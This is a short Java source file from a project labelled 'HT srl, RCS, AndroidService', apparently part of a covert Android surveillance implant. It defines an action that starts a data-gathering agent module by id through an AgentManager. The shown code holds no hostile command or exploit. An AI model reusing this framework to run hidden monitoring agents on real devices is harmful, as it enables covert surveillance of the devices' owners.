/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, AndroidService
 * File         : StartAgentAction.java
 * Created      : Apr 9, 2011
 * Author		: zeno
 * *******************************************/

package com.android.service.action;

import org.json.JSONObject;

import com.android.service.agent.AgentManager;
import com.android.service.auto.Cfg;
import com.android.service.util.Check;

/**
 * The Class StartAgentAction.
 */
public class StartModuleAction extends ModuleAction {
	private static final String TAG = "StartAgentAction"; //$NON-NLS-1$

	/**
	 * Instantiates a new start agent action.
	 * 
	 * @param params
	 *            the conf params
	 */
	public StartModuleAction(final ActionConf params) {
		super( params);
	}

	/*
	 * (non-Javadoc)
	 * 
	 * @see com.ht.AndroidServiceGUI.action.SubAction#execute()
	 */
	@Override
	public boolean execute() {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (execute): " + moduleId) ;//$NON-NLS-1$
		}
		final AgentManager agentManager = AgentManager.self();

		agentManager.start(moduleId);
		return true;
	}

}
